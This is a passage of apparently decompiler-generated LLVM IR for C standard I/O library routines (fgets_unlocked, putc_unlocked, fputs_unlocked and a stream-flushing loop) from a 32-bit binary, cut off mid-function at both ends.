  %v5_805ca70 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  %v2_805ca7c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074638.686 to i32))
  store i32 ptrtoint (i32* @global_var_8074638.686 to i32), i32* @ecx, align 4
  %v0_805ca82 = load i32, i32* @global_var_807aefc.687, align 4
  %v1_805ca88 = add i32 %v0_805ca82, 1
  store i32 %v1_805ca88, i32* @global_var_807aefc.687, align 4
  %v4_805ca91 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v5_805caa4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_8074620.697 to i32))
  %v2_805cab0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074620.697 to i32))
  %v4_805cac0 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_805cb423 = load i32, i32* @esi, align 4
  %v1_805cb424 = icmp eq i32 %v0_805cb423, 0
  %v1_805cb4411 = icmp eq i1 %v1_805cb424, false
  br i1 %v1_805cb4411, label %dec_label_pc_805caca, label %dec_label_pc_805cb46

dec_label_pc_805caca:                             ; preds = %dec_label_pc_805ca5e, %dec_label_pc_805cb3f
  %v0_805cad8 = phi i32 [ %v3_805cb3f, %dec_label_pc_805cb3f ], [ %v0_805cb423, %dec_label_pc_805ca5e ]
  %v1_805caca = inttoptr i32 %v0_805cad8 to i8*
  %v2_805caca = load i8, i8* %v1_805caca, align 1
  %v3_805caca = and i8 %v2_805caca, 64
  %v4_805caca = icmp eq i8 %v3_805caca, 0
  br i1 %v4_805caca, label %dec_label_pc_805cb3f, label %dec_label_pc_805cacf

dec_label_pc_805cacf:                             ; preds = %dec_label_pc_805caca
  %v0_805cacf = load i32, i32* @global_var_8074650.668, align 16
  %v9_805cacf = icmp eq i32 %v0_805cacf, 2
  br i1 %v9_805cacf, label %dec_label_pc_805caf7, label %dec_label_pc_805cad8

dec_label_pc_805cad8:                             ; preds = %dec_label_pc_805cacf
  %v1_805cad8 = add i32 %v0_805cad8, 56
  store i32 %v1_805cad8, i32* @ebx, align 4
  %v5_805cae7 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 %v1_805cad8)
  %v0_805caec = load i32, i32* @ebx, align 4
  %v2_805caef = call i32 @pthread_mutex_lock(i32 %v0_805caec)
  %v1_805caf9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805caf7

dec_label_pc_805caf7:                             ; preds = %dec_label_pc_805cacf, %dec_label_pc_805cad8
  %v0_805cb09 = phi i32 [ %v0_805cad8, %dec_label_pc_805cacf ], [ %v1_805caf9.pre, %dec_label_pc_805cad8 ]
  %v0_805caf7 = load i32, i32* @ebp, align 4
  %v2_805caf9 = inttoptr i32 %v0_805cb09 to i32*
  %v3_805caf9 = load i32, i32* %v2_805caf9, align 4
  %v4_805caf9 = or i32 %v3_805caf9, %v0_805caf7
  %v2_805cafb = urem i32 %v4_805caf9, 65536
  %v9_805cafb = and i32 %v2_805cafb, 832
  %v2_805caff = icmp eq i32 %v9_805cafb, 320
  %v1_805cb04 = icmp eq i1 %v2_805caff, false
  br i1 %v1_805cb04, label %dec_label_pc_805cb25, label %dec_label_pc_805cb06

dec_label_pc_805cb06:                             ; preds = %dec_label_pc_805caf7
  %v2_805cb0a = call i32 @__stdio_wcommit(i32 %v0_805cb09)
  %v1_805cb12 = icmp eq i32 %v2_805cb0a, 0
  br i1 %v1_805cb12, label %dec_label_pc_805cb1b, label %dec_label_pc_805cb16

dec_label_pc_805cb16:                             ; preds = %dec_label_pc_805cb06
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_805cb25

dec_label_pc_805cb1b:                             ; preds = %dec_label_pc_805cb06
  %v0_805cb1b = load i32, i32* @esi, align 4
  %v1_805cb1b = inttoptr i32 %v0_805cb1b to i16*
  %v2_805cb1b = load i16, i16* %v1_805cb1b, align 2
  %v3_805cb1b = and i16 %v2_805cb1b, -65
  store i16 %v3_805cb1b, i16* %v1_805cb1b, align 2
  %v0_805cb1f = load i32, i32* @esi, align 4
  %v1_805cb1f = add i32 %v0_805cb1f, 8
  %v2_805cb1f = inttoptr i32 %v1_805cb1f to i32*
  %v3_805cb1f = load i32, i32* %v2_805cb1f, align 4
  %v2_805cb22 = add i32 %v0_805cb1f, 28
  %v3_805cb22 = inttoptr i32 %v2_805cb22 to i32*
  store i32 %v3_805cb1f, i32* %v3_805cb22, align 4
  br label %dec_label_pc_805cb25

dec_label_pc_805cb25:                             ; preds = %dec_label_pc_805caf7, %dec_label_pc_805cb16, %dec_label_pc_805cb1b
  %v0_805cb25 = load i32, i32* @global_var_8074650.668, align 16
  %v9_805cb25 = icmp eq i32 %v0_805cb25, 2
  br i1 %v9_805cb25, label %dec_label_pc_805cb3f, label %dec_label_pc_805cb2e

dec_label_pc_805cb2e:                             ; preds = %dec_label_pc_805cb25
  %v4_805cb37 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805cb3f

dec_label_pc_805cb3f:                             ; preds = %dec_label_pc_805cb25, %dec_label_pc_805caca, %dec_label_pc_805cb2e
  %v0_805cb3f = load i32, i32* @esi, align 4
  %v1_805cb3f = add i32 %v0_805cb3f, 32
  %v2_805cb3f = inttoptr i32 %v1_805cb3f to i32*
  %v3_805cb3f = load i32, i32* %v2_805cb3f, align 4
  store i32 %v3_805cb3f, i32* @esi, align 4
  %v1_805cb42 = icmp eq i32 %v3_805cb3f, 0
  %v1_805cb44 = icmp eq i1 %v1_805cb42, false
  br i1 %v1_805cb44, label %dec_label_pc_805caca, label %dec_label_pc_805cb46

dec_label_pc_805cb46:                             ; preds = %dec_label_pc_805cb3f, %dec_label_pc_805ca5e
  %v0_805cb46 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_805cb73

dec_label_pc_805cb4d:                             ; preds = %dec_label_pc_805ca51
  store i32 0, i32* @edi, align 4
  %tmp26 = bitcast i16* %arg1 to i8*
  %v3_805cb4f = load i8, i8* %tmp26, align 1
  %v4_805cb4f = and i8 %v3_805cb4f, 64
  %v5_805cb4f = icmp eq i8 %v4_805cb4f, 0
  br i1 %v5_805cb4f, label %dec_label_pc_805cb73, label %dec_label_pc_805cb54

dec_label_pc_805cb54:                             ; preds = %dec_label_pc_805cb4d
  store i32 -1, i32* @edi, align 4
  %v2_805cb5b = call i32 @__stdio_wcommit(i32 %v4_805ca45)
  %v1_805cb63 = icmp eq i32 %v2_805cb5b, 0
  %v1_805cb65 = icmp eq i1 %v1_805cb63, false
  br i1 %v1_805cb65, label %dec_label_pc_805cb73, label %dec_label_pc_805cb67

dec_label_pc_805cb67:                             ; preds = %dec_label_pc_805cb54
  %v3_805cb67 = load i16, i16* %arg1, align 2
  %v4_805cb67 = and i16 %v3_805cb67, -65
  store i16 %v4_805cb67, i16* %arg1, align 2
  %v2_805cb6b = add i32 %v4_805ca45, 8
  %v3_805cb6b = inttoptr i32 %v2_805cb6b to i32*
  %v4_805cb6b = load i32, i32* %v3_805cb6b, align 4
  %v3_805cb6e = add i32 %v4_805ca45, 28
  %v4_805cb6e = inttoptr i32 %v3_805cb6e to i32*
  store i32 %v4_805cb6b, i32* %v4_805cb6e, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_805cb73

dec_label_pc_805cb73:                             ; preds = %dec_label_pc_805cb54, %dec_label_pc_805cb4d, %dec_label_pc_805cb46, %dec_label_pc_805cb67
  %v0_805cb76 = load i32, i32* @edi, align 4
  store i32 %v0_805ca3f, i32* @ebx, align 4
  store i32 %v0_805ca3e, i32* @esi, align 4
  store i32 %v0_805ca3d, i32* @edi, align 4
  store i32 %v0_805ca3c, i32* @ebp, align 4
  ret i32 %v0_805cb76

; uselistorder directives
  uselistorder i32 %v3_805cb3f, { 1, 2, 0 }
  uselistorder i32 %v4_805ca45, { 1, 2, 0, 3 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8074620.697 to i32), { 3, 2, 4, 0, 5, 6, 7, 1 }
  uselistorder i32* @global_var_807aefc.687, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8074638.686 to i32), { 0, 6, 1, 7, 2, 8, 9, 12, 3, 10, 5, 11, 4 }
  uselistorder i16* %arg1, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_805cb73, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805cb3f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805cb25, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805caf7, { 1, 0 }
  uselistorder label %dec_label_pc_805caca, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_805cb80 = load i32, i32* @ebp, align 4
  %v4_805cb87 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805cb87, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_805cb87, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_805cbd1.preheader, label %dec_label_pc_805cbdd

dec_label_pc_805cbd1.preheader:                   ; preds = %entry
  %v1_805cbd119 = add i32 %arg2, -1
  %v8_805cbd123 = icmp eq i32 %v1_805cbd119, 0
  store i32 %v1_805cbd119, i32* @esi, align 4
  %v1_805cbd224 = icmp eq i1 %v8_805cbd123, false
  br i1 %v1_805cbd224, label %dec_label_pc_805cb9b, label %dec_label_pc_805cbd4

dec_label_pc_805cb9b:                             ; preds = %dec_label_pc_805cbd1.preheader, %dec_label_pc_805cbcf.dec_label_pc_805cbd1_crit_edge.dec_label_pc_805cb9b_crit_edge
  %v0_805cb9b = phi i32 [ %v0_805cb9b.pre, %dec_label_pc_805cbcf.dec_label_pc_805cbd1_crit_edge.dec_label_pc_805cb9b_crit_edge ], [ %arg3, %dec_label_pc_805cbd1.preheader ]
  %v1_805cb9b = add i32 %v0_805cb9b, 16
  %v2_805cb9b = inttoptr i32 %v1_805cb9b to i32*
  %v3_805cb9b = load i32, i32* %v2_805cb9b, align 4
  store i32 %v3_805cb9b, i32* %eax.global-to-local, align 4
  %v2_805cb9e = add i32 %v0_805cb9b, 24
  %v3_805cb9e = inttoptr i32 %v2_805cb9e to i32*
  %v4_805cb9e = load i32, i32* %v3_805cb9e, align 4
  %v10_805cb9e = icmp ult i32 %v3_805cb9b, %v4_805cb9e
  %v1_805cba1 = icmp eq i1 %v10_805cb9e, false
  br i1 %v1_805cba1, label %dec_label_pc_805cbb1, label %dec_label_pc_805cba3

dec_label_pc_805cba3:                             ; preds = %dec_label_pc_805cb9b
  %v1_805cba3 = inttoptr i32 %v3_805cb9b to i8*
  %v2_805cba3 = load i8, i8* %v1_805cba3, align 1
  %v3_805cba3 = zext i8 %v2_805cba3 to i32
  %v4_805cba3 = load i32, i32* @edx, align 4
  %v5_805cba3 = and i32 %v4_805cba3, -256
  %v6_805cba3 = or i32 %v5_805cba3, %v3_805cba3
  store i32 %v6_805cba3, i32* @edx, align 4
  %v1_805cba5 = add i32 %v3_805cb9b, 1
  store i32 %v1_805cba5, i32* %eax.global-to-local, align 4
  %v2_805cba6 = load i32, i32* @ebx, align 4
  %v3_805cba6 = inttoptr i32 %v2_805cba6 to i8*
  store i8 %v2_805cba3, i8* %v3_805cba6, align 1
  %v0_805cba8 = load i32, i32* @ebx, align 4
  %v1_805cba8 = add i32 %v0_805cba8, 1
  store i32 %v1_805cba8, i32* @ebx, align 4
  %v0_805cba9 = load i32, i32* @edx, align 4
  %v1_805cba9 = trunc i32 %v0_805cba9 to i8
  %v10_805cba9 = icmp eq i8 %v1_805cba9, 10
  %v0_805cbac = load i32, i32* %eax.global-to-local, align 4
  %v1_805cbac = load i32, i32* @ebp, align 4
  %v2_805cbac = add i32 %v1_805cbac, 16
  %v3_805cbac = inttoptr i32 %v2_805cbac to i32*
  store i32 %v0_805cbac, i32* %v3_805cbac, align 4
  br i1 %v10_805cba9, label %dec_label_pc_805cbd4, label %dec_label_pc_805cbcf.dec_label_pc_805cbd1_crit_edge

dec_label_pc_805cbb1:                             ; preds = %dec_label_pc_805cb9b
  %v0_805cbb5 = call i32 @getc_unlocked()
  %v1_805cbb5 = trunc i32 %v0_805cbb5 to i8
  store i32 %v0_805cbb5, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_805cbb5, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_805cbc0 = icmp eq i1 %tmp, false
  br i1 %v1_805cbc0, label %dec_label_pc_805cbcf, label %dec_label_pc_805cbc2

dec_label_pc_805cbc2:                             ; preds = %dec_label_pc_805cbb1
  %v0_805cbc2 = load i32, i32* @ebp, align 4
  %v1_805cbc2 = inttoptr i32 %v0_805cbc2 to i8*
  %v2_805cbc2 = load i8, i8* %v1_805cbc2, align 1
  %v3_805cbc2 = and i8 %v2_805cbc2, 8
  %v4_805cbc2 = icmp eq i8 %v3_805cbc2, 0
  br i1 %v4_805cbc2, label %dec_label_pc_805cbd4, label %dec_label_pc_805cbdd

dec_label_pc_805cbcf:                             ; preds = %dec_label_pc_805cbb1
  %v3_805cbca = load i32, i32* @ebx, align 4
  %v4_805cbca = inttoptr i32 %v3_805cbca to i8*
  store i8 %v1_805cbb5, i8* %v4_805cbca, align 1
  %v0_805cbcc = load i32, i32* @ebx, align 4
  %v1_805cbcc = add i32 %v0_805cbcc, 1
  store i32 %v1_805cbcc, i32* @ebx, align 4
  %v11_805cbcd = icmp eq i8 %v1_805cbb5, 10
  br i1 %v11_805cbcd, label %dec_label_pc_805cbd4, label %dec_label_pc_805cbcf.dec_label_pc_805cbd1_crit_edge

dec_label_pc_805cbcf.dec_label_pc_805cbd1_crit_edge: ; preds = %dec_label_pc_805cba3, %dec_label_pc_805cbcf
  %v0_805cbd1.pre = load i32, i32* @esi, align 4
  %v1_805cbd1 = add i32 %v0_805cbd1.pre, -1
  %v8_805cbd1 = icmp eq i32 %v1_805cbd1, 0
  store i32 %v1_805cbd1, i32* @esi, align 4
  %v1_805cbd2 = icmp eq i1 %v8_805cbd1, false
  br i1 %v1_805cbd2, label %dec_label_pc_805cbcf.dec_label_pc_805cbd1_crit_edge.dec_label_pc_805cb9b_crit_edge, label %dec_label_pc_805cbd4

dec_label_pc_805cbcf.dec_label_pc_805cbd1_crit_edge.dec_label_pc_805cb9b_crit_edge: ; preds = %dec_label_pc_805cbcf.dec_label_pc_805cbd1_crit_edge
  %v0_805cb9b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805cb9b

dec_label_pc_805cbd4:                             ; preds = %dec_label_pc_805cbd1.preheader, %dec_label_pc_805cba3, %dec_label_pc_805cbcf.dec_label_pc_805cbd1_crit_edge, %dec_label_pc_805cbcf, %dec_label_pc_805cbc2
  %v0_805cbd4 = load i32, i32* @ebx, align 4
  %v1_805cbd4 = load i32, i32* @edi, align 4
  %tmp26 = icmp ugt i32 %v0_805cbd4, %v1_805cbd4
  br i1 %tmp26, label %dec_label_pc_805cbd8, label %dec_label_pc_805cbdd

dec_label_pc_805cbd8:                             ; preds = %dec_label_pc_805cbd4
  %v1_805cbd8 = inttoptr i32 %v0_805cbd4 to i8*
  store i8 0, i8* %v1_805cbd8, align 1
  %v0_805cbe2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805cbdf

dec_label_pc_805cbdd:                             ; preds = %dec_label_pc_805cbd4, %dec_label_pc_805cbc2, %entry
  br label %dec_label_pc_805cbdf

dec_label_pc_805cbdf:                             ; preds = %dec_label_pc_805cbd8, %dec_label_pc_805cbdd
  %v0_805cbe2 = phi i32 [ %v0_805cbe2.pre, %dec_label_pc_805cbd8 ], [ 0, %dec_label_pc_805cbdd ]
  store i32 %v0_805cbe2, i32* %eax.global-to-local, align 4
  store i32 %v0_805cb80, i32* @ebp, align 4
  ret i32 %v0_805cbe2

; uselistorder directives
  uselistorder i32 %v0_805cbe2, { 1, 0 }
  uselistorder i32 %v0_805cbd4, { 1, 0 }
  uselistorder i32 %v1_805cbd1, { 1, 0 }
  uselistorder i32 %v0_805cbb5, { 0, 2, 1 }
  uselistorder i32 %v0_805cb9b, { 1, 0 }
  uselistorder label %dec_label_pc_805cbdf, { 1, 0 }
  uselistorder label %dec_label_pc_805cbd4, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_805cbcf.dec_label_pc_805cbd1_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805cb9b, { 1, 0 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-9 = alloca i8, align 1
  %v0_805cbec = load i32, i32* @esi, align 4
  %v0_805cbed = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_805cbf5 = sext i8 %arg1 to i32
  store i32 %v4_805cbf5, i32* @esi, align 4
  %v1_805cbf9 = add i32 %arg2, 16
  %v2_805cbf9 = inttoptr i32 %v1_805cbf9 to i32*
  %v3_805cbf9 = load i32, i32* %v2_805cbf9, align 4
  store i32 %v3_805cbf9, i32* %eax.global-to-local, align 4
  %v2_805cbfc = add i32 %arg2, 28
  %v3_805cbfc = inttoptr i32 %v2_805cbfc to i32*
  %v4_805cbfc = load i32, i32* %v3_805cbfc, align 4
  %v10_805cbfc = icmp ult i32 %v3_805cbf9, %v4_805cbfc
  %v1_805cbff = icmp eq i1 %v10_805cbfc, false
  br i1 %v1_805cbff, label %dec_label_pc_805cc0e, label %dec_label_pc_805cc01

dec_label_pc_805cc01:                             ; preds = %entry
  store i32 %v4_805cbf5, i32* @edx, align 4
  %v3_805cc03 = inttoptr i32 %v3_805cbf9 to i8*
  store i8 %arg1, i8* %v3_805cc03, align 1
  %v0_805cc05 = load i32, i32* %eax.global-to-local, align 4
  %v1_805cc05 = add i32 %v0_805cc05, 1
  store i32 %v1_805cc05, i32* %eax.global-to-local, align 4
  %v1_805cc06 = load i32, i32* @ebx, align 4
  %v2_805cc06 = add i32 %v1_805cc06, 16
  %v3_805cc06 = inttoptr i32 %v2_805cc06 to i32*
  store i32 %v1_805cc05, i32* %v3_805cc06, align 4
  %v0_805cca3.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805cca3

dec_label_pc_805cc0e:                             ; preds = %entry
  %v1_805cc0e = inttoptr i32 %arg2 to i16*
  %v2_805cc0e = load i16, i16* %v1_805cc0e, align 2
  %v3_805cc0e = zext i16 %v2_805cc0e to i32
  %v1_805cc11 = and i32 %v3_805cc0e, 192
  store i32 %v1_805cc11, i32* %eax.global-to-local, align 4
  %v6_805cc16 = icmp eq i32 %v1_805cc11, 192
  br i1 %v6_805cc16, label %dec_label_pc_805cc31, label %dec_label_pc_805cc1d

dec_label_pc_805cc1d:                             ; preds = %dec_label_pc_805cc0e
  %v0_805cc1d = load i32, i32* @edx, align 4
  %sext = mul i32 %v0_805cc1d, 16777216
  %v5_805cc25 = sdiv i32 %sext, 16777216
  %v7_805cc25 = call i32 @__stdio_trans2w_o(i16* %v1_805cc0e, i32 128, i32 %v0_805cc1d, i32 %v5_805cc25)
  store i32 %v7_805cc25, i32* %eax.global-to-local, align 4
  %v1_805cc2d = icmp eq i32 %v7_805cc25, 0
  %v1_805cc2f = icmp eq i1 %v1_805cc2d, false
  br i1 %v1_805cc2f, label %dec_label_pc_805cca8, label %dec_label_pc_805cc1d.dec_label_pc_805cc31_crit_edge

dec_label_pc_805cc1d.dec_label_pc_805cc31_crit_edge: ; preds = %dec_label_pc_805cc1d
  %v0_805cc31.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805cc31

dec_label_pc_805cc31:                             ; preds = %dec_label_pc_805cc1d.dec_label_pc_805cc31_crit_edge, %dec_label_pc_805cc0e
  %v0_805cc94 = phi i32 [ %v0_805cc31.pre, %dec_label_pc_805cc1d.dec_label_pc_805cc31_crit_edge ], [ %arg2, %dec_label_pc_805cc0e ]
  %v1_805cc31 = add i32 %v0_805cc94, 4
  %v2_805cc31 = inttoptr i32 %v1_805cc31 to i32*
  %v3_805cc31 = load i32, i32* %v2_805cc31, align 4
  %v13_805cc31 = icmp eq i32 %v3_805cc31, -2
  %v1_805cc35 = icmp eq i1 %v13_805cc31, false
  br i1 %v1_805cc35, label %dec_label_pc_805cc3e, label %dec_label_pc_805cc37

dec_label_pc_805cc37:                             ; preds = %dec_label_pc_805cc31
  %v0_805cc37 = load i32, i32* @esi, align 4
  store i32 %v0_805cc37, i32* @ecx, align 4
  %v1_805cc39 = urem i32 %v0_805cc37, 256
  store i32 %v1_805cc39, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ccab

dec_label_pc_805cc3e:                             ; preds = %dec_label_pc_805cc31
  %v1_805cc3e = add i32 %v0_805cc94, 12
  %v2_805cc3e = inttoptr i32 %v1_805cc3e to i32*
  %v3_805cc3e = load i32, i32* %v2_805cc3e, align 4
  store i32 %v3_805cc3e, i32* %eax.global-to-local, align 4
  %v2_805cc41 = add i32 %v0_805cc94, 8
  %v3_805cc41 = inttoptr i32 %v2_805cc41 to i32*
  %v4_805cc41 = load i32, i32* %v3_805cc41, align 4
  %v15_805cc41 = icmp eq i32 %v3_805cc3e, %v4_805cc41
  br i1 %v15_805cc41, label %dec_label_pc_805cc86, label %dec_label_pc_805cc46

dec_label_pc_805cc46:                             ; preds = %dec_label_pc_805cc3e
  %v2_805cc46 = add i32 %v0_805cc94, 16
  %v3_805cc46 = inttoptr i32 %v2_805cc46 to i32*
  %v4_805cc46 = load i32, i32* %v3_805cc46, align 4
  %v15_805cc46 = icmp eq i32 %v3_805cc3e, %v4_805cc46
  %v1_805cc49 = icmp eq i1 %v15_805cc46, false
  br i1 %v1_805cc49, label %dec_label_pc_805cc5b, label %dec_label_pc_805cc4b

dec_label_pc_805cc4b:                             ; preds = %dec_label_pc_805cc46
  %v2_805cc4f = call i32 @__stdio_wcommit(i32 %v0_805cc94)
  store i32 %v2_805cc4f, i32* %eax.global-to-local, align 4
  %v1_805cc57 = icmp eq i32 %v2_805cc4f, 0
  %v1_805cc59 = icmp eq i1 %v1_805cc57, false
  br i1 %v1_805cc59, label %dec_label_pc_805cca8, label %dec_label_pc_805cc4b.dec_label_pc_805cc5b_crit_edge

dec_label_pc_805cc4b.dec_label_pc_805cc5b_crit_edge: ; preds = %dec_label_pc_805cc4b
  %v0_805cc5b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805cc5b

dec_label_pc_805cc5b:                             ; preds = %dec_label_pc_805cc4b.dec_label_pc_805cc5b_crit_edge, %dec_label_pc_805cc46
  %v0_805cc5b = phi i32 [ %v0_805cc5b.pre, %dec_label_pc_805cc4b.dec_label_pc_805cc5b_crit_edge ], [ %v0_805cc94, %dec_label_pc_805cc46 ]
  %v1_805cc5b = add i32 %v0_805cc5b, 16
  %v2_805cc5b = inttoptr i32 %v1_805cc5b to i32*
  %v3_805cc5b = load i32, i32* %v2_805cc5b, align 4
  store i32 %v3_805cc5b, i32* %eax.global-to-local, align 4
  %v0_805cc5e = load i32, i32* @esi, align 4
  store i32 %v0_805cc5e, i32* %edx.global-to-local, align 4
  %v1_805cc60 = trunc i32 %v0_805cc5e to i8
  %v3_805cc60 = inttoptr i32 %v3_805cc5b to i8*
  store i8 %v1_805cc60, i8* %v3_805cc60, align 1
  %v0_805cc62 = load i32, i32* %eax.global-to-local, align 4
  %v1_805cc62 = add i32 %v0_805cc62, 1
  store i32 %v1_805cc62, i32* %eax.global-to-local, align 4
  %v1_805cc63 = load i32, i32* @ebx, align 4
  %v2_805cc63 = add i32 %v1_805cc63, 16
  %v3_805cc63 = inttoptr i32 %v2_805cc63 to i32*
  store i32 %v1_805cc62, i32* %v3_805cc63, align 4
  %v0_805cc66 = load i32, i32* @ebx, align 4
  %v1_805cc66 = add i32 %v0_805cc66, 1
  %v2_805cc66 = inttoptr i32 %v1_805cc66 to i8*
  %v3_805cc66 = load i8, i8* %v2_805cc66, align 1
  %v4_805cc66 = urem i8 %v3_805cc66, 2
  %v5_805cc66 = icmp eq i8 %v4_805cc66, 0
  br i1 %v5_805cc66, label %dec_label_pc_805cca1, label %dec_label_pc_805cc6c

dec_label_pc_805cc6c:                             ; preds = %dec_label_pc_805cc5b
  %v0_805cc6c = load i32, i32* %edx.global-to-local, align 4
  %v1_805cc6c = trunc i32 %v0_805cc6c to i8
  %v10_805cc6c = icmp eq i8 %v1_805cc6c, 10
  %v1_805cc6f = icmp eq i1 %v10_805cc6c, false
  br i1 %v1_805cc6f, label %dec_label_pc_805cca1, label %dec_label_pc_805cc71

dec_label_pc_805cc71:                             ; preds = %dec_label_pc_805cc6c
  %v2_805cc75 = call i32 @__stdio_wcommit(i32 %v0_805cc66)
  store i32 %v2_805cc75, i32* %eax.global-to-local, align 4
  %v1_805cc7d = icmp eq i32 %v2_805cc75, 0
  br i1 %v1_805cc7d, label %dec_label_pc_805cca1, label %dec_label_pc_805cc81

dec_label_pc_805cc81:                             ; preds = %dec_label_pc_805cc71
  %v0_805cc81 = load i32, i32* @ebx, align 4
  %v1_805cc81 = add i32 %v0_805cc81, 16
  %v2_805cc81 = inttoptr i32 %v1_805cc81 to i32*
  %v3_805cc81 = load i32, i32* %v2_805cc81, align 4
  %v4_805cc81 = add i32 %v3_805cc81, -1
  store i32 %v4_805cc81, i32* %v2_805cc81, align 4
  br label %dec_label_pc_805cca8

dec_label_pc_805cc86:                             ; preds = %dec_label_pc_805cc3e
  %v0_805cc86 = load i32, i32* @esi, align 4
  %v6_805cc88 = trunc i32 %v0_805cc86 to i8
  store i8 %v6_805cc88, i8* %stack_var_-9, align 1
  %v2_805cc8f = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_805cc8f, i32* %eax.global-to-local, align 4
  %v5_805cc94 = inttoptr i32 %v0_805cc94 to i16*
  %sext10 = mul i32 %v0_805cc86, 16777216
  %v5_805cc95 = sdiv i32 %sext10, 16777216
  %v7_805cc95 = call i32 @__stdio_WRITE(i16* %v5_805cc94, i32 %v2_805cc8f, i32 1, i32 %v5_805cc95)
  store i32 %v7_805cc95, i32* %eax.global-to-local, align 4
  %v1_805cc9d = icmp eq i32 %v7_805cc95, 0
  br i1 %v1_805cc9d, label %dec_label_pc_805cca8, label %dec_label_pc_805cca1

dec_label_pc_805cca1:                             ; preds = %dec_label_pc_805cc86, %dec_label_pc_805cc71, %dec_label_pc_805cc6c, %dec_label_pc_805cc5b
  %v0_805cca1 = load i32, i32* @esi, align 4
  store i32 %v0_805cca1, i32* @edx, align 4
  br label %dec_label_pc_805cca3

dec_label_pc_805cca3:                             ; preds = %dec_label_pc_805cc01, %dec_label_pc_805cca1
  %v0_805cca3 = phi i32 [ %v0_805cca3.pre, %dec_label_pc_805cc01 ], [ %v0_805cca1, %dec_label_pc_805cca1 ]
  %v1_805cca3 = urem i32 %v0_805cca3, 256
  store i32 %v1_805cca3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ccab

dec_label_pc_805cca8:                             ; preds = %dec_label_pc_805cc86, %dec_label_pc_805cc4b, %dec_label_pc_805cc1d, %dec_label_pc_805cc81
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ccab

dec_label_pc_805ccab:                             ; preds = %dec_label_pc_805cca3, %dec_label_pc_805cc37, %dec_label_pc_805cca8
  %v0_805ccb0 = phi i32 [ %v1_805cca3, %dec_label_pc_805cca3 ], [ %v1_805cc39, %dec_label_pc_805cc37 ], [ -1, %dec_label_pc_805cca8 ]
  store i32 %v0_805cbed, i32* @ebx, align 4
  store i32 %v0_805cbec, i32* @esi, align 4
  ret i32 %v0_805ccb0

; uselistorder directives
  uselistorder i32 %v1_805cca3, { 1, 0 }
  uselistorder i32 %v1_805cc39, { 1, 0 }
  uselistorder i32 %v0_805cc94, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v0_805cc1d, { 1, 0 }
  uselistorder label %dec_label_pc_805ccab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805cca8, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_805cca3, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_805ccb4 = load i32, i32* @esi, align 4
  %v0_805ccb5 = load i32, i32* @ebx, align 4
  store i32 %v0_805ccb5, i32* %stack_var_-8, align 4
  %v4_805ccb9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805ccb9, i32* @ebx, align 4
  %v3_805ccbe = call i32 @strlen(i8* %arg1)
  store i32 %v3_805ccbe, i32* @esi, align 4
  %v0_805cccf = load i32, i32* @ebx, align 4
  %v6_805ccd0 = call i32 @__GI_fwrite_unlocked(i32 %v0_805cccf, i64 1, i32 %v3_805ccbe, i32 %arg2)
  %v1_805ccdb = load i32, i32* @esi, align 4
  %v12_805ccdb = icmp eq i32 %v6_805ccd0, %v1_805ccdb
  %v1_805ccdd = icmp eq i1 %v12_805ccdb, false
  br i1 %v1_805ccdd, label %dec_label_pc_805cce1, label %dec_label_pc_805ccdf

dec_label_pc_805ccdf:                             ; preds = %entry
  br label %dec_label_pc_805cce1

